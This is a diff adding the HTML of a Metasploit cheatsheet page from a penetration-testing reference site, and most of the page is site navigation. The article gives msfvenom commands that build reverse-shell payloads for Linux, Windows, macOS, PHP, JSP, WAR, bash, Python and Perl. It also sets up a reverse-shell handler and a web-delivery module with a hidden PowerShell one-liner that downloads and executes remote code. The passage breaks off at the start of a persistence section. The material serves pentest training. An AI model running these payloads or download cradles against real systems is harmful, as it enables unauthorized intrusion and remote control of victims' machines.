@@ -1,0 +1,1743 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Tips, tricks and a quick reference or cheatsheet for being successful while using Metasploit.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Metasploit" />
+<meta property="og:description" content="Tips, tricks and a quick reference or cheatsheet for being successful while using Metasploit." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/metasploit_cheatsheet/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-03T00:00:00+00:00" />
+<title>Metasploit | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="active">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Metasploit</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#metasploit">Metasploit</a>
+      <ul>
+        <li><a href="#installation">Installation</a></li>
+        <li><a href="#sessions">Sessions</a></li>
+        <li><a href="#background-handler">Background handler</a></li>
+        <li><a href="#meterpreter---basic">Meterpreter - Basic</a>
+          <ul>
+            <li><a href="#generate-a-meterpreter">Generate a meterpreter</a></li>
+            <li><a href="#meterpreter-webdelivery">Meterpreter Webdelivery</a></li>
+            <li><a href="#get-system">Get System</a></li>
+            <li><a href="#persistence-startup">Persistence Startup</a></li>
+            <li><a href="#network-monitoring">Network Monitoring</a></li>
+            <li><a href="#portforward">Portforward</a></li>
+            <li><a href="#upload--download">Upload / Download</a></li>
+            <li><a href="#execute-from-memory">Execute from Memory</a></li>
+            <li><a href="#mimikatz">Mimikatz</a></li>
+            <li><a href="#pass-the-hash---psexec">Pass the Hash - PSExec</a></li>
+            <li><a href="#use-socks-proxy">Use SOCKS Proxy</a></li>
+          </ul>
+        </li>
+        <li><a href="#scripting-metasploit">Scripting Metasploit</a></li>
+        <li><a href="#multiple-transports">Multiple transports</a></li>
+        <li><a href="#best-of---exploits">Best of - Exploits</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="metasploit">
+  Metasploit
+  <a class="anchor" href="#metasploit">#</a>
+</h1>
+<h2 id="installation">
+  Installation
+  <a class="anchor" href="#installation">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl https<span style="color:#960050;background-color:#1e0010">:</span>//raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod <span style="color:#ae81ff">755</span> msfinstall &amp;&amp; ./msfinstall
+</span></span></code></pre></div><p>or docker</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sudo docker run --rm -it -p <span style="color:#ae81ff">443</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span> -v ~/.msf4<span style="color:#960050;background-color:#1e0010">:</span>/root/.msf4 -v /tmp/msf<span style="color:#960050;background-color:#1e0010">:</span>/tmp/data remnux/metasploit
+</span></span></code></pre></div><h2 id="sessions">
+  Sessions
+  <a class="anchor" href="#sessions">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>CTRL+Z   -&gt; Session <span style="color:#66d9ef">in</span> Background
+</span></span><span style="display:flex;"><span>sessions -&gt; List sessions
+</span></span><span style="display:flex;"><span>sessions -i session_number -&gt; Interact with Session with id
+</span></span><span style="display:flex;"><span>sessions -u session_number -&gt; Upgrade session to a meterpreter
+</span></span><span style="display:flex;"><span>sessions -u session_number LPORT=<span style="color:#ae81ff">4444</span> PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&gt; Upgrade session to a meterpreter
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sessions -c cmd           -&gt; Execute a command on several sessions
+</span></span><span style="display:flex;"><span>sessions -i <span style="color:#ae81ff">10</span>-<span style="color:#ae81ff">20</span> -c <span style="color:#e6db74">&#34;id&#34;</span> -&gt; Execute a command on several sessions
+</span></span></code></pre></div><h2 id="background-handler">
+  Background handler
+  <a class="anchor" href="#background-handler">#</a>
+</h2>
+<p>ExitOnSession : the handler will not exit if the meterpreter dies.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>screen -dRR
+</span></span><span style="display:flex;"><span>sudo msfconsole
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set PAYLOAD generic/shell_reverse_tcp
+</span></span><span style="display:flex;"><span>set LHOST <span style="color:#ae81ff">0.0</span>.0.0
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>set ExitOnSession false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>generate -o /tmp/meterpreter.exe <span style="color:#f92672">-f</span> exe
+</span></span><span style="display:flex;"><span>to_handler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[ctrl+a] + [<span style="color:#66d9ef">d</span>]
+</span></span></code></pre></div><h2 id="meterpreter---basic">
+  Meterpreter - Basic
+  <a class="anchor" href="#meterpreter---basic">#</a>
+</h2>
+<h3 id="generate-a-meterpreter">
+  Generate a meterpreter
+  <a class="anchor" href="#generate-a-meterpreter">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> elf &gt; shell.elf
+</span></span><span style="display:flex;"><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> exe &gt; shell.exe
+</span></span><span style="display:flex;"><span>$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> macho &gt; shell.macho
+</span></span><span style="display:flex;"><span>$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo <span style="color:#e6db74">&#39;&lt;?php &#39;</span> | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+</span></span><span style="display:flex;"><span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> asp &gt; shell.asp
+</span></span><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.jsp
+</span></span><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> war &gt; shell.war
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_python LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.py
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_bash LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.sh
+</span></span><span style="display:flex;"><span>$ msfvenom -p cmd/unix/reverse_perl LHOST=<span style="color:#e6db74">&#34;10.10.10.110&#34;</span> LPORT=<span style="color:#ae81ff">4242</span> <span style="color:#f92672">-f</span> raw &gt; shell.pl
+</span></span></code></pre></div><h3 id="meterpreter-webdelivery">
+  Meterpreter Webdelivery
+  <a class="anchor" href="#meterpreter-webdelivery">#</a>
+</h3>
+<p>Set up a Powershell web delivery listening on port 8080.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>use exploit/multi/script/web_delivery
+</span></span><span style="display:flex;"><span>set TARGET <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_http
+</span></span><span style="display:flex;"><span>set LHOST <span style="color:#ae81ff">10.0</span>.0.1
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[<span style="color:#66d9ef">Net.WebRequest</span>]::GetSystemWebProxy();$g.Proxy.Credentials=[<span style="color:#66d9ef">Net.CredentialCache</span>]::DefaultCredentials;IEX $g.downloadstring(<span style="color:#e6db74">&#39;http://10.0.0.1:8080/rYDPPB&#39;</span>);
+</span></span></code></pre></div><h3 id="get-system">
+  Get System
+  <a class="anchor" href="#get-system">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>meterpreter &gt; getsystem
+</span></span><span style="display:flex;"><span>...got system via technique <span style="color:#ae81ff">1</span> (Named Pipe Impersonation (<span style="color:#66d9ef">In</span> Memory/Admin)).
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username<span style="color:#960050;background-color:#1e0010">:</span> NT AUTHORITY\SYSTEM
+</span></span></code></pre></div><h3 id="persistence-startup">
+  Persistence Startup
+  <a class="anchor" href="#persistence-startup">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>OPTIONS<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-A        Automatically start a matching exploit/multi/handler to connect to the agent
